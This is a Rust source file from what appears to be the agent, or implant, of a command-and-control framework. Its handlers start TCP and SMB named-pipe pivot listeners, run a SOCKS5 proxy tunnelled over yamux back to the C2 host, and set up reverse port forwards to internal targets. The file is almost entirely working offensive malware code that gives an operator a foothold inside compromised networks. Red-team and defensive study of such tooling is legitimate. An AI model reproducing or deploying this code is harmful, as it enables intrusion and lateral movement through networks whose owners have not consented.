// src/agent/handlers/network.rs — Pivot, SOCKS proxy, reverse port forwarding

use tokio::net::TcpStream;
use tokio_util::compat::{TokioAsyncReadCompatExt, FuturesAsyncReadCompatExt};
use yamux::Connection;
use futures::StreamExt;

use crate::socks;
use crate::lc;
use super::{HandlerContext, DispatchResult, AgentAction, RportfwdHandle};

// ── Helpers ────────────────────────────────────────────────────────────

/// Extract the bare host from c2_host, stripping any URL scheme.
///
/// The agent stores c2_host as a bare IP/hostname for TLS/TCP transports
/// ("192.168.56.1") but as a full URL for HTTP transports
/// ("https://192.168.56.1" or "http://192.168.56.1:8080").
///
/// TcpStream::connect() requires "host:port" — if c2_host contains a scheme,
/// the format!("{}:{}", host, port) produces "https://192.168.56.1:TUNNELPORT"
/// which is not a valid socket address and connect() returns an error,
/// silently dropping the tunnel connection.
fn bare_host(c2_host: &str) -> &str {
    // Strip "https://", "http://", or any other scheme
    if let Some(rest) = c2_host.strip_prefix("https://") {
        // Also strip any trailing path: "192.168.56.1:4443/beacon" → "192.168.56.1:4443"
        rest.split('/').next().unwrap_or(rest)
    } else if let Some(rest) = c2_host.strip_prefix("http://") {
        rest.split('/').next().unwrap_or(rest)
    } else {
        c2_host
    }
}

// ── Pivot ──────────────────────────────────────────────────────────────

pub async fn handle_pivot_tcp(ctx: &HandlerContext, args: &str) -> DispatchResult {
    let port = args.trim().parse::<u16>().unwrap_or(0);
    if port == 0 {
        return DispatchResult::Reply(String::new(), lc!("Invalid Port"), 1, AgentAction::None);
    }
    let res = ctx.pivot_mgr.lock().await.start_agent_listener(port).await;
    DispatchResult::Reply(res, String::new(), 0, AgentAction::None)
}

pub async fn handle_pivot_smb(ctx: &HandlerContext, args: &str) -> DispatchResult {
    let name = args.trim();
    if name.is_empty() {
        return DispatchResult::Reply(String::new(), lc!("Usage: pivot:listener_smb <pipe_name>"), 1, AgentAction::None);
    }
    let res = ctx.pivot_mgr.lock().await.start_named_pipe_listener(name.to_string()).await;
    DispatchResult::Reply(res, String::new(), 0, AgentAction::None)
}

// ── SOCKS Proxy ────────────────────────────────────────────────────────

pub async fn handle_proxy_start(ctx: &HandlerContext, cmd: &str, _req_id: u64) -> (String, String, i32) {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 2 { return (String::new(), lc!("Usage: proxy:start <port>"), 1); }
    let port = match parts[1].parse::<u16>() {
        Ok(p) => p,
        Err(_) => return (String::new(), lc!("Invalid Port"), 1),
    };

    let warning = if ctx.c2_host.starts_with("http://") || ctx.c2_host.starts_with("https://") {
        "[!] WARNING: Agent uses HTTP transport but proxy:start opens a raw TCP connection. \
         This bypasses the HTTP channel and may be blocked by egress firewalls. "
    } else {
        ""
    };

    if let Ok(mut guard) = ctx.proxy_handle.lock() {
        if let Some(handle) = guard.take() { handle.abort(); }
    }

    // Strip URL scheme so TcpStream::connect gets a plain "host:port" address.
    // Without this, HTTP-transport agents set c2_host = "https://192.168.56.1"
    // and the connect address becomes "https://192.168.56.1:TUNNELPORT" which
    // is not a valid socket address — connect() fails and the tunnel never forms.
    let host = bare_host(&ctx.c2_host).to_string();

    let handle = tokio::spawn(async move {
        let addr = format!("{}:{}", host, port);
        match TcpStream::connect(&addr).await {
            Ok(stream) => {
                let stream = Box::pin(TokioAsyncReadCompatExt::compat(stream));
                let connection = Connection::new(stream, yamux::Config::default(), yamux::Mode::Client);
                // The server opens streams (yamux Server mode); we accept them and run SOCKS5.
                yamux::into_stream(connection)
                    .for_each_concurrent(None, |s| async move {
                        if let Ok(yamux_stream) = s {
                            let mut tokio_stream = FuturesAsyncReadCompatExt::compat(yamux_stream);
                            let _ = socks::handle_socks5_stream(&mut tokio_stream).await;
                        }
                    })
                    .await;
            }
            Err(e) => {
                eprintln!("[Proxy] Failed to connect tunnel to {}: {}", addr, e);
            }
        }
    });

    match ctx.proxy_handle.lock() {
        Ok(mut guard) => *guard = Some(handle.abort_handle()),
        Err(_) => return (String::new(), "Proxy handle lock poisoned".into(), 1),
    }
    (format!("{}{} {}", warning, lc!("Proxy Tunnel Started on Port"), port), String::new(), 0)
}

pub fn handle_proxy_stop(ctx: &HandlerContext) -> (String, String, i32) {
    match ctx.proxy_handle.lock() {
        Ok(mut guard) => {
            if let Some(handle) = guard.take() {
                handle.abort();
                (lc!("Proxy Stopped"), String::new(), 0)
            } else {
                (lc!("No proxy running"), String::new(), 1)
            }
        }
        Err(_) => (String::new(), "Proxy handle lock poisoned".into(), 1),
    }
}

// ── Reverse Port Forwarding ────────────────────────────────────────────

pub async fn handle_rportfwd_start(ctx: &HandlerContext, cmd: &str) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 4 {
        return DispatchResult::Reply(
            String::new(),
            lc!("Usage: rportfwd:start <tunnel_port> <target_host> <target_port>"),
            1, AgentAction::None,
        );
    }

    let tunnel_port = match parts[1].parse::<u16>() {
        Ok(p) => p,
        Err(_) => return DispatchResult::Reply(String::new(), lc!("Invalid tunnel port"), 1, AgentAction::None),
    };
    let target_host = parts[2].to_string();
    let target_port = match parts[3].parse::<u16>() {
        Ok(p) => p,
        Err(_) => return DispatchResult::Reply(String::new(), lc!("Invalid target port"), 1, AgentAction::None),
    };

    if let Ok(handles) = ctx.rportfwd_handles.lock() {
        if handles.iter().any(|h| h.server_port == tunnel_port) {
            return DispatchResult::Reply(
                String::new(),
                format!("rportfwd on tunnel port {} already active", tunnel_port),
                1, AgentAction::None,
            );
        }
    }

    // Strip URL scheme for the same reason as proxy:start above.
    let c2_host = bare_host(&ctx.c2_host).to_string();
    let target_h = target_host.clone();
    let target_p = target_port;

    let task = tokio::spawn(async move {
        let addr = format!("{}:{}", c2_host, tunnel_port);
        let stream = match TcpStream::connect(&addr).await {
            Ok(s) => s,
            Err(e) => {
                eprintln!("[rportfwd] Failed to connect tunnel to {}: {}", addr, e);
                return;
            }
        };

        let stream = Box::pin(TokioAsyncReadCompatExt::compat(stream));
        let connection = Connection::new(stream, yamux::Config::default(), yamux::Mode::Client);

        yamux::into_stream(connection).for_each_concurrent(None, |result| {
            let host = target_h.clone();
            let port = target_p;
            async move {
                if let Ok(yamux_stream) = result {
                    let target_addr = format!("{}:{}", host, port);
                    if let Ok(target_sock) = TcpStream::connect(&target_addr).await {
                        let (mut ri, mut wi) = tokio::io::split(
                            FuturesAsyncReadCompatExt::compat(yamux_stream),
                        );
                        let (mut ro, mut wo) = tokio::io::split(target_sock);
                        let _ = tokio::try_join!(
                            tokio::io::copy(&mut ri, &mut wo),
                            tokio::io::copy(&mut ro, &mut wi)
                        );
                    }
                }
            }
        }).await;
    });

    let abort = task.abort_handle();

    match ctx.rportfwd_handles.lock() {
        Ok(mut handles) => {
            handles.push(RportfwdHandle {
                server_port: tunnel_port,
                target_host: target_host.clone(),
                target_port,
                abort,
            });
        }
        Err(_) => return DispatchResult::Reply(String::new(), "rportfwd lock poisoned".into(), 1, AgentAction::None),
    }

    DispatchResult::Reply(
        format!("Reverse port forward active: tunnel:{} → {}:{}", tunnel_port, target_host, target_port),
        String::new(), 0, AgentAction::None,
    )
}

pub fn handle_rportfwd_stop(ctx: &HandlerContext, cmd: &str) -> DispatchResult {
    let parts: Vec<&str> = cmd.split_whitespace().collect();
    if parts.len() != 2 {
        return DispatchResult::Reply(String::new(), lc!("Usage: rportfwd:stop <tunnel_port>"), 1, AgentAction::None);
    }
    let port = match parts[1].parse::<u16>() {
        Ok(p) => p,
        Err(_) => return DispatchResult::Reply(String::new(), lc!("Invalid port"), 1, AgentAction::None),
    };

    match ctx.rportfwd_handles.lock() {
        Ok(mut handles) => {
            if let Some(idx) = handles.iter().position(|h| h.server_port == port) {
                let h = handles.remove(idx);
                h.abort.abort();
                DispatchResult::Reply(
                    format!("Stopped rportfwd on tunnel port {}", port),
                    String::new(), 0, AgentAction::None,
                )
            } else {
                DispatchResult::Reply(String::new(), format!("No rportfwd on port {}", port), 1, AgentAction::None)
            }
        }
        Err(_) => DispatchResult::Reply(String::new(), "rportfwd lock poisoned".into(), 1, AgentAction::None),
    }
}

pub fn handle_rportfwd_list(ctx: &HandlerContext) -> DispatchResult {
    match ctx.rportfwd_handles.lock() {
        Ok(handles) => {
            if handles.is_empty() {
                return DispatchResult::Reply("No active reverse port forwards".to_string(), String::new(), 0, AgentAction::None);
            }
            let lines: Vec<String> = handles.iter().map(|h| {
                format!("tunnel:{} → {}:{}", h.server_port, h.target_host, h.target_port)
            }).collect();
            DispatchResult::Reply(lines.join("\n"), String::new(), 0, AgentAction::None)
        }
        Err(_) => DispatchResult::Reply(String::new(), "rportfwd lock poisoned".into(), 1, AgentAction::None),
    }
}
